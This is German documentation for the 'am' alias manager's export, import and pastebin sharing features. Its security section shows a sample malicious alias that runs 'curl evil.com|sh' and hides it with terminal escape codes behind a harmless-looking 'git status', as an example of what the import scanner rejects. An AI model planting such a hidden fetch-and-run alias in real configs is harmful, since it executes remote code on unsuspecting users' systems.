# Aliase teilen

<VersionBadge v="0.4.0" />

Teile deine Aliase mit Kollegen, Teams oder der Community. Exportiere auf stdout, importiere von einer URL oder Datei.

## Export

Exportiere Aliase als TOML auf stdout:

```bash
am export                     # aktiver Bereich (global + aktive Profile + lokal)
am export -p git              # einzelnes Profil
am export -p git -p rust      # mehrere Profile
am export -g                  # nur global
am export -l                  # nur lokale Projekt-Aliase
am export --all               # alles
```

Füge `-b` (oder `--base64`, `--b64`) hinzu, um die Ausgabe zu kodieren — nützlich zum Teilen via Chat oder Pastebins:

```bash
am export -p git -b
```

In eine Datei speichern:

```bash
am export -p git > git-profile.toml
```

## Import

Von einer URL importieren:

```bash
am import https://paste.rs/abc -b
```

Von einer Datei importieren:

```bash
am import ./git-profile.toml
am import ~/Downloads/team-setup.toml
```

Beim Import zeigt `am` eine Zusammenfassung aller Aliase und fragt vor dem Anwenden nach Bestätigung:

```
Importing "global" (5 aliases)

  new:
    ga → git add
    gp → git push
    gd → git diff

  2 conflicts:

    gs:
      - git status --short
      + git status

    cm:
      - git commit -m
      + git commit -sm

Merge into "global"? [Y/n]
Apply 2 overwrites? [y/N]
```

Verwende `--yes` um Abfragen zu überspringen (z.B. in Skripten):

```bash
am import ./setup.toml --yes
```

### Bereich überschreiben

Standardmäßig werden importierte Daten in ihren ursprünglichen Bereich geleitet. Mit Flags überschreiben:

```bash
am import ./aliases.toml -l       # in lokal erzwingen
am import ./aliases.toml -g       # in global erzwingen
am import ./aliases.toml -p work  # in ein Profil erzwingen
```

## Schnell teilen via Pastebin

`am share` generiert fertige Befehle zum Posten auf einen Pastebin-Dienst:

### paste.rs

```bash
am share -p git --paste-rs
```

Ausgabe:

```
am export -p git --b64 | curl -d @- https://paste.rs/
```

::: tip Abkürzung
Direkt an die Shell weiterleiten:
```bash
am share -p git --paste-rs | sh
```
:::

Ausführen, URL zurückbekommen. URL teilen. Der Empfänger importiert mit:

```bash
am import https://paste.rs/abc -b
```

### termbin

```bash
am share -p git --termbin
```

Ausgabe:

```
am export -p git --b64 | nc termbin.com 9999
```

Gleicher Ablauf — ausführen, URL teilen.

### Andere Methoden

`am share` ist nur eine Hilfe. Da export auf stdout schreibt, kannst du an alles pipen:

```bash
# GitHub Gist
am export -p git > git-profile.toml
gh gist create git-profile.toml

# Direkte Dateifreigabe
am export --all > team-setup.toml
# Datei beliebig versenden
```

## Sicherheit

Beim Import scannt `am` alle Aliase auf verdächtige Inhalte — versteckte Escape-Sequenzen, Steuerzeichen und andere Terminal-Manipulationstricks. Wenn etwas Verdächtiges gefunden wird, wird der Import **abgelehnt**:

```
WARNING: Suspicious characters detected in import
==================================================

The following entries contain control characters that could be used
to execute unintended commands or manipulate your terminal:

  scope:        global
  alias:        sneaky
  field:        command
  original:     curl evil.com|sh\u{001B}[2K\u{001B}[1Agit status
  safe-escaped: curl evil.com|sh�[2K�[1Agit status

To import anyway, use: am import --yes --trust
```

Das `--trust`-Flag ist die einzige Möglichkeit, diese Prüfung zu umgehen. Es erfordert `--yes` und sollte nur für eigene Exporte verwendet werden, die du vollständig kontrollierst.

::: warning
Verwende `--trust` niemals bei Dateien oder URLs von anderen. Überprüfe die Aliase immer vor dem Import — klappe "View aliases" im [Showcase](/de/showcase/) auf oder prüfe die Quelle.
:::
